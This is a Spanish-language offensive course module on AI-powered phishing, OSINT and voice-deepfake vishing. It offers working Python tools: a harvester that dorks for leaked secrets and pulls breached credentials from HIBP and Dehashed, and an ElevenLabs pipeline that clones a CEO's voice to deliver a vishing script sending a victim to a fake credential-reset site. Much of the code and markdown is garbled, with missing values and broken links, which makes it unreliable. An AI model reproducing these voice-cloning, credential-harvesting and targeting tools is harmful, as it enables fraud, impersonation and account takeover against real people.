# 41 - phishing Avanzado e Ingeniería Social con IA

> **Duración:** 5 días (40 hs teórico-prácticas)
> **Dificultad:** Avanzado
> **Role:** [red team](../raw/r3d-t34m-1nfr4.md) / [osint](../raw/0s1nt.md) / [social engineering](../raw/ph1sh1ng.md#ingenieria-social)

---

## Índice

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (1333 lineas)


- [1. Introducción a la Ingeniería Social Moderna](#1-introducción-a-la-ingeniería-social-moderna) - [1.1 Evolución del phishing](#11-evolución-del-phishing) - 1.2 El fac[tor humano como vector](#12-el-factor-humano-como-vector) - [1.3 Taxonomía de ataques de ingeniería social](#13-taxonomía-de-ataques-de-ingeniería-social) - [1.4 El rol de la IA en la ingeniería social](#14-el-rol-de-la-ia-en-la-ingeniería-social)
- 2. [osint Automatizado con Agentes IA](#2-osint-automatizado-con-agentes-ia) - [2.1 Recolección pasiva de información](#21-recolección-pasiva-de-información) - [2.2 Agentes multi-propósito para OSINT](#22-agentes-multi-propósito-para-osint) - 2.3 [pe](../raw/w1n-1nt3rn4ls.md#pe)[rfilado de víctimas con NLP](#23-perfilado-de-víctimas-con-nlp) - 2.4 Enriquecimiento de datos con [redes sociales](#24-enriquecimiento-de-datos-con-redes-sociales) - [2.5 Automatización con GPT-HP y agentes personalizados](#25-automatización-con-gpt-hp-y-agentes-personalizados)
- [3. Deepfakes de Voz (Vishing)](#3-deepfakes-de-voz-vishing) - [3.1 Fundamentos de clonación de voz](#31-fundamentos-de-clonación-de-voz) - [3.2 ElevenLabs: clonación de alta fidelidad](#32-elevenlabs-clonación-de-alta-fidelidad) - [3.3 Resemble.ai: clonación con pocas muestras](#33-resembleai-clonación-con-pocas-muestras) - [3.4 Coqui TTS: clonación open-source](#34-coqui-tts-clonación-open-source) - [3.5 Conversión de voz en tiempo real](#35-conversión-de-voz-en-tiempo-real) - [3.6 Calidad de muestras de voz requerida](#36-calidad-de-muestras-de-voz-requerida) - [3.7 Detección de deepfakes de voz](#37-detección-de-deepfakes-de-voz) - [3.8 Ejercicio práctico: vishing con voz clonada](#38-ejercicio-práctico-vishing-con-voz-clonada)
- [4. Deepfakes de Video](#4-deepfakes-de-video) - [4.1 Fundamentos de generación de video sintético](#41-fundamentos-de-generación-de-video-sintético) - [4.2 HeyGen: avatares realistas](#42-heygen-avatares-realistas) - [4.3 Synthesia: video con avatares IA](#43-synthesia-video-con-avatares-ia) - [4.4 D-ID: avatares parlantes](#44-d-id-avatares-parlantes) - 4.5 Wav2L[ip: sincronización labial precisa](#45-wav2lip-sincronización-labial-precisa) - [4.6 Deepfakes en videollamadas en tiempo real](#46-deepfakes-en-videollamadas-en-tiempo-real) - [4.7 Detección de deepfakes de video](#47-detección-de-deepfakes-de-video) - [4.8 Ejercicio práctico: video deepfake para spear phishing](#48-ejercicio-práctico-video-deepfake-para-spear-phishing)
- 5. [spear phishing Avanzado con IA](#5-spear-phishing-avanzado-con-ia) - [5.1 Generación de emails con IA](#51-generación-de-emails-con-ia) - [5.2 Personalización multilingüe](#52-personalización-multilingüe) - [5.3 Creación de pretextos con contexto](#53-creación-de-pretextos-con-contexto) - [5.4 Superación de filtros gramaticales](#54-superación-de-filtros-gramaticales) - [5.5 A/B testing de phish con IA](#55-ab-testing-de-phish-con-ia) - [5.6 Automatización de campañas completas](#56-automatización-de-campañas-completas) - [5.7 Ejercicio práctico: campaña spear phishing end-to-end](#57-ejercicio-práctico-campaña-spear-phishing-end-to-end)
- 6. Infr[aestructura de Phishing](#6-infraestructura-de-phishing) - 6.1 Registro de domin[ios y reputación](#61-registro-de-dominios-y-reputación) - 6.2 Certificados [ssl) automáticos](#62-certificados-ssl-automáticos) - [6.3 Email warmup y construcción de reputación](#63-email-warmup-y-construcción-de-reputación) - [6.4 Evasión de filtros antispam](#64-e-vasión-de-filtros-antispam) - [6.5 Domain parking y redirección](#65-domain-parking-y-redirección) - [6.6 Alojamiento de páginas de phishing](#66-alojamiento-de-páginas-de-phishing) - [6.7 Ejercicio práctico: infraestructura completa](#67-ejercicio-práctico-infraestructura-completa)
- [7. Herramientas de Phishing](#7-herramientas-de-phishing) - 7.1 Evilginx2: [proxy inverso para phishing](#71-evilginx2-proxy-inverso-para-phishing) - [7.2 Modlishka: phishing con bypass 2FA](#72-modlishka-phishing-con-bypass-2fa) - 7.3 G[pthog: phishing potenciado con GPT](#73-gpthog-phishing-potenciado-con-gpt) - [7.4 Everything: contexto completo](#74-everything-contexto-completo) - [7.5 Comparativa de herramientas](#75-comparativa-de-herramientas)
- [8. MFA Fatigue y Bypass de Autenticación](#8-mfa-fatigue-y-bypass-de-autenticación) - [8.1 Concepto de MFA fatigue](#81-concepto-de-mfa-fatigue) - [8.2 Automatización de push notifications](#82-automatización-de-push-notifications) - [8.3 Ataques basados en timing](#83-ataques-basados-en-timing) - [8.4 MFA bypass mediante soporte técnico](#84-mfa-bypass-mediante-soporte-técnico) - [8.5 SIM swapping como vector](#85-sim-swapping-como-vector) - [8.6 Ejercicio práctico: MFA fatigue simulado](#86-ejercicio-práctico-mfa-fatigue-simulado)
- [9. Evasión de Detección](#9-evasión-de-detección) - [9.1 Detectores de contenido IA](#91-detectores-de-contenido-ia) - [9.2 Humanización de texto generado](#92-humanización-de-texto-generado) - [9.3 Patrones de comunicación realistas](#93-patrones-de-comunicación-realistas) - [9.4 Evasión de análisis de headers](#94-evasión-de-análisis-de-headers) - [9.5 Ofuscación de enlaces y payloads](#95-ofuscación-de-enlaces-y-payloads) - [9.6 Ejercicio práctico: evasión de detección](#96-ejercicio-práctico-e-vasión-de-detección)
- [10. Automatización Multi-Agente](#10-automatización-multi-agente) - [10.1 Arquitectura de agentes para phishing](#101-arquitectura-de-agentes-para-phishing) - [10.2 Agente OSINT → Agente pretexto → Agente entrega](#102-agente-osint--agente-pretexto--agente-entrega) - 10.3 [pipeline completo automatizado](#103-pipeline-completo-automatizado) - [10.4 Manejo de contexto entre etapas](#104-manejo-de-contexto-entre-etapas) - [10.5 Ejercicio práctico: pipeline multi-agente](#105-ejercicio-práctico-pipeline-multi-agente)
- [11. Defensa y Mitigación](#11-defensa-y-mitigación) - [11.1 Capacitación con simulaciones realistas](#111-capacitación-con-simulaciones-realistas) - [11.2 Políticas de MFA resistentes](#112-políticas-de-mfa-resistentes) - [11.3 Detección de deepfakes](#113-detección-de-deepfakes) - [11.4 Respuesta a incidentes de phishing](#114-respuesta-a-incidentes-de-phishing)
- [12. Laboratorio Final Integrador](#12-laboratorio-final-integrador)

---

## 1. Introducción a la Ingeniería Social Moderna

### 1.1 Evolución del [phishing](../raw/ph1sh1ng.md)

El phishing como técnica de ataque nació en los años 90, cuando atacantes comenzaron a crear réplicas de páginas de AOL para robar credenciales. En ese entonces, los ataques eran toscos: emails mal escritos, con errores gramaticales obvios y plantillas HTML descuidadas.

**Fase 1 (1995-2005): Phishing artesanal**
- Emails genéricos masivos ("Dear customer")
- Errores gramaticales evidentes
- Páginas HTML copiadas manualmente
- Servidores comprometidos como hosting
- Tasas de éxito: 1-5% (suficiente para ser rentable)

**Fase 2 (2005-2015): Phishing profesional**
- Kits de phishing empaquetados (uno de los más famosos fue el kit de phishing de PayPal)
- Uso de homógrafos IDN (dominios que lucen idénticos usando caracteres Unicode)
- Certificados [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))) en páginas falsas (Let's Encrypt democratizó esto)
- s[pear phishing](./raw/ con investigación manual
- Tasas de éxito: 5-15% en [spear phishing](../raw/ph1sh1ng.md#spear-phishing)

**Fase 3 (2015-2020): Phishing automatizado**
- Frameworks como Evilginx2 y Modlishka
- Bypass de 2FA mediante [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) reverso
- Automatización de campañas con [gophish](../raw/ph1sh1ng.md#gophish)
- Plantillas dinámicas y personalización básica
- Tasas de éxito: 10-30% en spear phishing con 2FA bypass

**Fase 4 (2020-presente): Phishing con IA**
- Deepfakes de voz y video para [vishing](../raw/ph1sh1ng.md#vishing)
- Emails perfectos generados por llms (GPT-4, Claude, Gemini)
- [osint](../raw/0s1nt.md) automatizado con agentes IA
- Pretextos dinámicos con contexto completo
- Evasión de detectores de contenido IA
- Tasas de éxito: 30-60% en ataques con IA generativa

La diferencia fundamental entre la fase 3 y la fase 4 es que antes el atacante necesitaba invertir horas de investigación manual y redacción cuidadosa. Hoy, un solo agente IA puede hacer en segundos lo que antes tomaba días.

**Estadísticas clave (2024-2025):**
- El 91% de los ciberataques comienzan con un email de phishing
- El costo promedio de un ataque de spear phishing exitoso: .9M USD
- El 65% de los atacantes usa IA generativa en alguna etapa del ataque
- Los deepfakes de voz aumentaron 350% interanual
- El bypass de MFA con IA creció 400% en el último año

### 1.2 El factor humano como vector

La ingeniería social explota sesgos cognitivos documentados. Entenderlos es clave tanto para atacar como para defender:

**Sesgo de autoridad:** Las personas tienden a obedecer figuras de autoridad. Un email del "CEO" o "IT Department" tiene más chances de ser clickeado. La IA permite suplantar la voz y hasta el video de figuras de autoridad.

**Sesgo de urgencia:** Cuando algo requiere acción inmediata, el pensamiento crítico disminuye. "Tu cuenta será desactivada en 24 horas" genera presión. Los LLMs pueden generar urgencia convincente y contextual.

**Sesgo de reciprocidad:** Si alguien te hace un favor, sentís la necesidad de devolverlo. "Completá esta encuesta de 2 minutos y entrás en el sorteo de una gift card."

**Sesgo de compromiso:** Si una persona ya tomó una acción pequeña (hizo clic en un link), es más probable que tome acciones más grandes (ingrese credenciales). Esto se explota con páginas de phishing multi-paso.

**Sesgo de escasez:** "Solo 3 licencias disponibles para tu departamento" crea FOMO (fear of missing out). La IA puede personalizar la escasez según el contexto del target.

**Sesgo de familiaridad:** Los ataques que usan nombres de colegas, proyectos actuales o jerga interna tienen tasas de éxito mucho más altas. Aquí es donde la IA brilla: puede procesar grandes volúmenes de comunicación interna para extraer jerga y relaciones.

**Sesgo de consistencia:** Si alguien se comprometió públicamente con algo (ej: "la seguridad es prioridad"), es más probable que actúe de forma consistente con esa creencia.

**Sesgo de anclaje:** La primera información que recibe una persona sobre un tema influencia desproporcionadamente su decisión final. Los atacantes pueden "anclar" a la víctima con información falsa pero creíble.

**Modelo de ataque psicológico con IA:**

```python
# psicologia_ataque.py - Modelado psicológico para ingeniería social con IA

biases_attack_map = { "authority": { "trigger": "Suplantar figura de autoridad (CEO, IT Manager, compliance)", "ai_role": "Generar comunicación que imite el estilo exacto de la autoridad", "effectiveness": 0.85 }, "urgency": { "trigger": "Amenaza de consecuencias inmediatas (bloqueo, penalidad, pérdida)", "ai_role": "Calibrar nivel de urgencia según personalidad del target", "effectiveness": 0.78 }, "reciprocity": { "trigger": "Ofrecer valor antes de pedir (gift card, reporte, acceso)", "ai_role": "Identificar qué valor es más relevante para cada target", "effectiveness": 0.72 }, "scarcity": { "trigger": "Crear percepción de oferta limitada en tiempo o cantidad", "ai_role": "Generar escasez contextualizada (ej: 2 licencias restantes para tu equipo)", "effectiveness": 0.68 }, "social_proof": { "trigger": "Mostrar que otros ya actuaron (tus compañeros ya completaron..)", "ai_role": "Extraer conexiones reales del target para personalizar prueba social", "effectiveness": 0.65 }, "liking": { "trigger": "Establecer rapport antes del pedido (gustos compartidos, conexiones)", "ai_role": "Analizar perfil OSINT para encontrar puntos en común", "effectiveness": 0.70 }, "fear": { "trigger": "Inducir miedo a consecuencias negativas específicas", "ai_role": "Personalizar el miedo según el rol y responsabilidades del target", "effectiveness": 0.82 }
}
```

### 1.3 Taxonomía de ataques de ingeniería social

Clasificación completa de vectores de ingeniería social moderna:

**Por medio de ataque:**
- **Email**: phishing masivo, spear phishing, whaling (dirigido a C-suite)
- **Voz**: vishing (voice phishing), robocalls con IA, deepfake voice calls
- **SMS**: [smishing](../raw/ph1sh1ng.md#smishing) (SMS phishing), ataque a códigos 2FA vía SMS
- **Mensajería**: WhatsApp, Telegram, LinkedIn InMail, Slack, Teams
- **Presencial**: pretexting, tailgating, shoulder surfing, dumpster diving
- **Videollamada**: deepfake video calls, Zoom bombing [social engineering](../raw/ph1sh1ng.md#ingenieria-social)
- **QR code**: quishing (QR code phishing en lugares físicos)
- **USB drop**: dejar USBs infectados en estacionamientos (con IA, los archivos parecen más legítimos)

**Por objetivo:**
- **Credenciales**: login/password, tokens MFA, API keys, certificates
- **Información**: datos internos, clientes, finanzas, secretos comerciales
- **Acceso**: [vpn](../raw/4n0n1m4t0.md#vpn), RDP, aplicaciones internas, [cloud](../raw/cl0ud-h4ck1ng.md) services
- **Acción**: transferencias bancarias, cambios de cuenta, aprobaciones
- **Malware**: ejecución de [payload](../raw/m3t4spl01t.md#payloads), descarga de malware, ransomware delivery

**Por nivel de personalización:**
- **Masivo**: mismo mensaje a miles de targets (tasa de éxito: 0.1-1%)
- **Segmentado**: adaptado por industria/rol/demografía (tasa: 1-5%)
- **Spear**: personalizado por individuo con investigación (tasa: 10-30%)
- **Whale**: dirigido a ejecutivos/C-suite (tasa: 30-60%)
- **Hyper-personalizado**: con IA y OSINT automatizado (tasa: 40-70%)

**Por complejidad técnica:**
- **Simple**: link malicioso directo, página HTML copiada
- **Intermedio**: página clonada + SSL + dominio similar + redirección
- **Avanzado**: proxy reverso + bypass 2FA + deepfake + email spoofing
- **Complejo**: campaña multi-etapa con agentes IA + voz/video deepfake + [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)

**Ejemplo de árbol de decisión de ataque:**

```
¿Target disponible en LinkedIn?
├── Sí → ¿Fotos/videos públicos? → ¿Suficientes para deepfake?
│ ├── Sí → Vector: videollamada deepfake (efectividad: 70%)
│ └── No → ¿Audios públicos?
│ ├── Sí → Vector: vishing con voz clonada (efectividad: 65%)
│ └── No → Vector: spear phishing por email (efectividad: 45%)
└── No → ¿Email corporativo conocido? ├── Sí → ¿MFA activo? │ ├── Sí → Vector: evilginx2 + MFA fatigue (efectividad: 50%) │ └── No → Vector: phishing directo (efectividad: 40%) └── No → ¿Teléfono conocido? ├── Sí → Vector: smishing + vishing (efectividad: 35%) └── No → Vector: OSINT profiling primero
```

### 1.4 El rol de la IA en la ingeniería social

La [inteligencia artificial](../raw/41-h4ck1ng.md) generativa transformó la ingeniería social en tres áreas clave:

**1. Investigación y OSINT automatizado**
Antes: el atacante pasaba horas en LinkedIn, Google, [redes](../raw/r3d3s-f0nd4m3nt0s.md) sociales recolectando información manualmente. Un perfil completo podía tomar 2-4 horas.
Ahora: agentes IA recorren múltiples fuentes, extraen relaciones, detectan patrones y construyen perfiles completos en 2-5 minutos.

**2. Generación de contenido hiperpersonalizado**
Antes: plantillas con variables {{name}}, {{company}}, {{role}}. El contenido era genérico y muchas veces tenía errores.
Ahora: LLMs generan emails completos con contexto situacional, estilo de escritura de la persona suplantada, referencias a proyectos actuales y eventos recientes. Sin errores gramaticales, con tono perfectamente calibrado.

**3. Deepfakes multimodales**
Antes: el vishing requería imitación de voz humana (inconsistente y agotador). El video deepfake requería horas de GPU y expertos en ML.
Ahora: clonación de voz con segundos de muestra, video deepfake con lip-sync en minutos, avatares completos para videollamadas en tiempo real.

**Arquitectura típica de un ataque moderno con IA:**

```
┌─────────────┐ ┌──────────────┐ ┌──────────────┐
│  Agente │ │  Agente │ │  Agente │
│  OSINT │───▶│  Pretexto │───▶│  Entrega │
│  (recolec-  │ │  (generación │ │  (phishing)  │
│ ción) │ │ de historia│ │ │
└─────────────┘ └──────────────┘ └──────────────┘ │ │ │ ▼ ▼ ▼
┌─────────────────────────────────────────────────────┐
│ Orchestrator │
│  - Gestiona estado del ataque │
│  - Decide próximos pasos según respuesta │
│  - Mantiene contexto entre etapas │
│  - Mide efectividad y adapta estrategia │
│  - Activa deepfakes cuando es necesario │
└─────────────────────────────────────────────────────┘
```

**Modelos de IA comúnmente usados en ingeniería social ofensiva:**

| Modelo | Uso | Acceso | Calidad |
|--------|-----|--------|---------|
| GPT-4 / GPT-4 Turbo | Generación de texto, pretextos, análisis | API (pago) | Excelente |
| Claude 3 Opus | Análisis, razonamiento, detección de sesgos | API (pago) | Excelente |
| ElevenLabs | Clonación de voz | API (pago) | Excelente |
| Coqui XTTS v2 | Clonación de voz open-source | Local (gratis) | Buena |
| Wav2Lip | Lip-sync para deepfakes de video | Local (gratis) | Buena |
| HeyGen | Avatares IA para video | SaaS (pago) | Muy buena |
| Whisper (OpenAI) | Transcripción de audio para OSINT | API/Local | Excelente |

---

## 2. [osint](../raw/0s1nt.md) Automatizado con Agentes IA

### 2.1 Recolección pasiva de información

La recolección pasiva (sin interactuar directamente con el objetivo) es la base de cualquier ataque de ingeniería social. Con IA, este [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) se automatiza completamente.

**Fuentes de información principales:**

**[redes](../raw/r3d3s-f0nd4m3nt0s.md) sociales profesionales (LinkedIn):**
- Puesto actual y anteriores con fechas exactas
- Habilidades declaradas (hard y soft skills)
- Conexiones y redes (1er, 2do, 3er grado)
- Actividad reciente (posts, comentarios, likes)
- Educación y certificaciones con fechas de expiración
- Grupos a los que pertenece
- Recomendaciones recibidas/dadas

**Redes sociales personales:**
- Facebook: intereses, viajes, familia, eventos, grupos
- Instagram: ubicaciones visitadas, personas etiquetadas, historias
- Twitter/X: opiniones, contactos frecuentes, threads, retweets
- TikTok: intereses de contenido consumido, tendencias seguidas
- Reddit: comunidades (subreddits) frecuentadas, historial de posts/comentarios

**Fuentes corporativas:**
- Página web de la empresa (about, team, careers)
- Glassdoor: reseñas de empleados, cultura organizacional, salarios
- Crunchbase: inversiones, estructura, competidores, funding rounds
- [google dorks](../raw/0s1nt.md#google-dorks): documentos expuestos, paneles admin
- GitHub: repositorios, commits, emails, nombres de usuarios internos
- Stack Overflow: preguntas técnicas, perfil profesional

**Fuentes técnicas:**
- [shodan](../raw/0s1nt.md#shodan)/Censys: infraestructura expuesta (servicios, versiones, puertos)
- Have I Been Pwned: credenciales filtradas históricamente
- Dehashed: bases de datos filtradas con credenciales en texto claro
- IntelX: búsqueda en dark web y fuentes deep web
- SecurityTrails: subdominios, registros [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) históricos

**Script de ejemplo: recolector OSINT multi-fuente:**

```python
#!/usr/bin/env python3
\"\"\"
recolector_osint.py - Agente OSINT automatizado multi-fuente
Requiere: pip install requests beautifulsoup4 shodan pythonwhois
\"\"\"

import os
import json
import time
import requests
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict

@dataclass
class TargetProfile: name: str email: str company: str role: str linkedin: Optional[str] = None twitter: Optional[str] = None github: Optional[str] = None skills: List[str] = None certifications: List[str] = None colleagues: List[str] = None recent_projects: List[str] = None breached_creds: List[str] = None interests: List[str] = None language_tone: str = "formal" work_hours: str = "9-18" travel_history: List[str] = None communication_style: str = "professional" def __post_init__(self): self.skills = self.skills or self.certifications = self.certifications or self.colleagues = self.colleagues or self.recent_projects = self.recent_projects or self.breached_creds = self.breached_creds or self.interests = self.interests or self.travel_history = self.travel_history or class GoogleDorkSearcher: \"\"\"Búsqueda avanzada con Google Dorks automatizada\"\"\" def __init__(self): self.base_url = "https://www.google.com/search" def search(self, query: str, num_results: int = 10) -> List[str]: params = {"q": query, "num": num_results} headers = { "User-Agent": ( "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " "AppleWebKit/537.36 (KHTML, like Gecko) " "Chrome/120.0.0.0 Safari/537.36" ) } resp = requests.get(self.base_url, params=params, headers=headers) from bs4 import BeautifulSoup soup = BeautifulSoup(resp.text, "html.parser") urls = for link in soup.find_all("a"): href = link.get("href") if href and "http" in href and "google" not in href: urls.append(href) return urls[:num_results] def corporate_dorks(self, company: str, domain: str) -> Dict[str, List[str]]: dorks = { "pdf_exposed": f"site:{domain} filetype:pdf (confidential OR internal OR private)", "admin_panels": f"site:{domain} inurl:admin OR inurl:login OR inurl:portal", "git_repos": f"site:github.com \\\"{company}\\\" (password OR secret OR key OR token)", "pastebin": f"site:pastebin.com \\\"{company}\\\" (password OR email)", "employee_list": f"site:{domain} (\\\"team\\\" OR \\\"employees\\\" OR \\\"staff\\\")", "email_format": f"\\\"@{domain}\\\" (email OR contact OR mail)", "exposed_docs": f"site:docs.google.com \\\"{company}\\\" (confidential)", "job_postings": f"site:linkedin.com \\\"{company}\\\" (hiring OR job OR career)" } results = {} for name, dork in dorks.items: results[name] = self.search(dork) return results class BreachChecker: \"\"\"Verificador de credenciales filtradas\"\"\" def __init__(self, hibp_api_key: Optional[str] = None): self.hibp_key = hibp_api_key def check_hibp(self, email: str) -> List[Dict]: url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}" headers = {"hibp-api-key": self.hibp_key or "", "User-Agent": "OSINT-Agent"} resp = requests.get(url, headers=headers) if resp.status_code == 200: return resp.json return def check_dehashed(self, email: str) -> Dict: api_key = os.getenv("DEHASHED_API_KEY", "") api_secret = os.getenv("DEHASHED_API_SECRET", "") if not api_key or not api_secret: return {"error": "Dehashed credenciales no configuradas"} url = f"https://api.dehashed.com/search?query=email:{email}" resp = requests.get(url, auth=(api_key, api_secret) if resp.status_code == 200: return resp.json return {} class OSINTPipeline: \"\"\"Orquestador completo de OSINT\"\"\" def __init__(self, config: Dict): self.config = config self.profile = TargetProfile( name=config.get("target_name", ""), email=config.get("target_email", ""), company=config.get("target_company", ""), role=config.get("target_role", "") ) self.dorker = GoogleDorkSearcher self.breach_checker = BreachChecker(config.get("hibp_key") def run_dork_recon(self) -> Dict[str, List[str]]: return self.dorker.corporate_dorks( self.profile.company, self.config.get("corporate_domain", "") ) def run_breach_recon(self) -> Dict: email = self.profile.email if not email: return {"error": "Email no especificado"} return { "hibp": self.breach_checker.check_hibp(email), "dehashed": self.breach_checker.check_dehashed(email), } def run_full_recon(self) -> TargetProfile: print("[*] Iniciando recolección OSINT..") dork_data = self.run_dork_recon breach_data = self.run_breach_recon if "hibp" in breach_data: for breach in breach_data["hibp"]: self.profile.breached_creds.append(breach["Name"]) return self.profile if __name__ == "__main__": config = { "target_name": "Juan Pérez", "target_email": "jperez@empresa.com", "target_company": "Empresa SA", "target_role": "CFO", "corporate_domain": "empresa.com", "hibp_key": os.getenv("HIBP_API_KEY", "") } pipeline = OSINTPipeline(config) profile = pipeline.run_full_recon print(json.dumps(asdict(profile), indent=2, default=str)
```

**Comandos de OSINT con herramientas CLI:**

`ash
# theHarvester - recolección de emails, subdominios, ips
theHarvester -d empresa.[com](../raw/w1n-s9bsyst3ms.md#com) -b google,linkedin,bing,yahoo

# recon-ng - framework de reconocimiento
[recon](../raw/0s1nt.md#reconocimiento)-ng
marketplace install all
workspaces create target_empresa
use recon/contacts-contacts/linkedin_contacts
run

# Sherlock - búsqueda de username en redes sociales
sherlock juan.perez

# Holehe - verifica registros en servicios online
holehe jperez@empresa.com

# Social-analyzer - análisis de perfiles sociales
social-analyzer --username "juan.perez" --mode fast

# Emailfinder - encuentra emails asociados
emailfinder -d empresa.com

# SpiderFoot - OSINT automation
spiderfoot -s empresa.com -t all -o spiderfoot_report.html

## 3. Deepfakes de Voz (Vishing)

### 3.1 Fundamentos de clonación de voz

La clonación de voz (voice cloning) es una técnica de IA que permite sintetizar la voz de una persona a partir de muestras de audio. Se basa en modelos de deep learning entrenados con grandes volúmenes de datos de voz.

**Arquitectura general de un sistema de clonación de voz:**

`
Audio Sample → Feature Extraction (Mel-Spectrogram, MFCC) ↓ Speaker Encoder (Embedding Vector) ↓
┌──────────────────────────────────────────────────┐
│  Synthesizer (Tacotron 2, FastSpeech 2) │
│  Text → Mel-Spectrogram condicionado por speaker │
└──────────────────────┬───────────────────────────┘ ↓
┌──────────────────────────────────────────────────┐
│  Vocoder (WaveNet, HiFi-GAN, WaveGlow) │
│  Mel-Spectrogram → Waveform de audio │
└──────────────────────┬───────────────────────────┘ ↓ Post-Processor (Denoise, Normalize) ↓ Audio Output
`

**Tipos de clonación de voz:**

| Tipo | Muestras requeridas | Calidad | Tiempo de entrenamiento | Costo |
|------|---------------------|---------|------------------------|-------|
| Zero-shot (sin entrenamiento) | 0 (voz genérica) | Baja | Instantáneo |  |
| Few-shot (pocas muestras) | 5-30 segundos | Media-Alta | 5-30 min |  |
| Fine-tuning | 1-10 minutos | Alta-Muy Alta | 30 min - 4 hs | $ |
| Clonación profesional | 30+ minutos | Casi perfecta | Días |  |

**Modelos populares de clonación de voz:**

| Modelo | Creador | Acceso | Multi-idioma | Few-shot | Calidad |
|--------|---------|--------|-------------|----------|---------|
| Tacotron 2 + WaveNet | Local | Abierto | Limitado | No | Alta |
| FastSpeech 2 + HiFi-GAN | Microsoft | Abierto | Sí | No | Muy Alta |
| YourTTS | Coqui | Abierto | Sí | Sí | Alta |
| XTTS v2 | Coqui | Abierto | Sí (17 idiomas) | Sí | Muy Alta |
| VALL-E | Microsoft | Propietario | No | Sí (3 seg) | Alta |
| naturalSpeech 2 | Microsoft | Propietario | Limitado | No | Excelente |
| ElevenLabs | ElevenLabs | API | Sí (29 idiomas) | Sí (1 min) | Excelente |
| Resemble AI | Resemble | API | Sí | Sí (5 seg) | Muy Alta |
| Play.ht | PlayHT | API | Sí | Sí | Muy Alta |

**Conceptos clave:**
- **Mel-Spectrogram**: Representación visual del audio en escala Mel (frecuencia percibida por humanos)
- **Speaker Embedding**: Vector numérico (generalmente 256-512 dimensiones) que representa características únicas de la voz
- **Vocoder**: Modelo generativo que convierte mel-spectrogram a forma de onda de audio
- **Encoder**: Extrae características invariantes del hablante desde el audio de referencia
- **Synthesizer**: Genera mel-spectrogram condicionado por el texto y la identidad del hablante
- **Zero-shot**: Clonar una voz nunca vista durante el entrenamiento
- **Few-shot**: Clonar la voz con muy pocas muestras (5-30 segundos)
- **Conditioning**: proceso de condicionar el generador con el embedding del hablante target

### 3.2 ElevenLabs: clonación de alta fidelidad

ElevenLabs es actualmente el líder del mercado en clonación de voz con IA. Su modelo se entrena con millones de horas de audio y ofrece calidad indistinguible de la voz humana.

**Características principales:**
- **Voice Library**: Biblioteca de +10,000 voces pre-entrenadas
- **Voice Cloning**: Clonación instantánea con 1+ minuto de muestra
- **Professional Voice Cloning**: Clonación con grabación de estudio guiada
- **Speech-to-Speech**: Conversión de voz en tiempo real (cambiar la voz manteniendo prosodia)
- **Sound Effects**: Generación de efectos de sonido con texto
- **Projects**: Organización de contenido narrativo largo
- **Dubbing**: Doblaje automático preservando la voz original
- **API**: Integración programática completa con SDKs

**Configuración de voz (voice settings):**

```python
# Configuración óptima de parámetros de voz ElevenLabs
voice_settings = { "stability": 0.3, # 0.0 = más expresivo, 1.0 = más estable/robótico "similarity_boost": 0.85, # 0.0-1.0 qué tan similar a la muestra original "style": 0.2, # 0.0 = neutral, 1.0 = exagerado "use_speaker_boost": True # Mejora la claridad en condiciones ruidosas
}

# Para vishing natural, recomendaríamos:
vishing_settings = { "stability": 0.35, # Un poco de variación natural "similarity_boost": 0.8, # Balance fidelidad/naturalidad "style": 0.1, # Poco estilo extra
}
```

**API completa de ElevenLabs para [vishing](../raw/ph1sh1ng.md#vishing):**

```python
#!/usr/bin/env python3
\"\"\"elevenlabs_vishing.py - Pipeline de vishing con ElevenLabs\"\"\"

import os
import json
import requests
from typing import List, Optional

class ElevenLabsVishing: \"\"\"Pipeline completo de vishing con ElevenLabs\"\"\" def __init__(self, api_key: str): self.api_key = api_key self.base_url = "https://api.elevenlabs.io/v1" self.headers = { "xi-api-key": api_key, "Content-Type": "application/json" } def list_voices(self) -> list: resp = requests.get(f"{self.base_url}/voices", headers=self.headers) return resp.json.get("voices", ) if resp.ok else def clone_voice(self, name: str, audio_files: List[str], description: str = "") -> Optional[str]: \"\"\"Clona una voz desde archivos de audio locales\"\"\" url = f"{self.base_url}/voices/add" payload = {"name": name, "description": description} files_data = for i, fp in enumerate(audio_files): with open(fp, "rb") as f: files_data.append("files", (f"sample_{i}.mp3", f.read, "audio/mpeg")) resp = requests.post(url, headers={"xi-api-key": self.api_key}, data=payload, files=files_data) if resp.ok: voice_id = resp.json["voice_id"] print(f"[+] Voz clonada: {voice_id}") return voice_id print(f"[-] Error: {resp.text}") return None def generate_speech(self, text: str, voice_id: str, model_id: str = "eleven_multilingual_v2", stability: float = 0.35, similarity: float = 0.8) -> Optional[bytes]: \"\"\"Genera audio TTS\"\"\" url = f"{self.base_url}/text-to-speech/{voice_id}" payload = { "text": text, "model_id": model_id, "voice_settings": { "stability": stability, "similarity_boost": similarity, "style": 0.1, "use_speaker_boost": True } } resp = requests.post(url, headers=self.headers, json=payload) return resp.content if resp.ok else None def generate_vishing_call(self, voice_id: str, script: dict, output_file: str = "vishing_call.mp3") -> str: \"\"\"Genera audio completo de vishing desde un script\"\"\" parts = parts.append(script.get("opening", "") parts.extend(script.get("script_steps", ) parts.append(script.get("cta", "") parts.append(script.get("closing", "") full_text = " ".join(parts) audio_bytes = self.generate_speech(full_text, voice_id) if audio_bytes: with open(output_file, "wb") as f: f.write(audio_bytes) print(f"[+] Vishing call generado: {output_file}") return output_file return "" if __name__ == "__main__": api_key = os.getenv("ELEVENLABS_API_KEY") if not api_key: print("[-] Configurá ELEVENLABS_API_KEY") exit(1) ev = ElevenLabsVishing(api_key) voice_id = ev.clone_voice("CEO Clonado", ["ceo_sample1.mp3", "ceo_sample2.mp3"]) if voice_id: script = { "opening": "Hola Laura, soy Carlos de IT. Disculpá que te llame sin avisar.", "script_steps": [ "Detectamos un acceso no autorizado desde Rusia a tu cuenta corporativa.", "Necesito que verifiques tu identidad con el código que te voy a enviar.", "También necesito que ingreses a portal-seguridad.com/verify para cambiar tu contraseña." ], "cta": "Hacelo ahora mientras estamos al teléfono, así cerramos el incidente.", "closing": "Perfecto, gracias Laura. Ante cualquier duda, llamame." } ev.generate_vishing_call(voice_id, script, "vishing_operativo.mp3")
```

### 3.3 Resemble.ai: clonación con pocas muestras

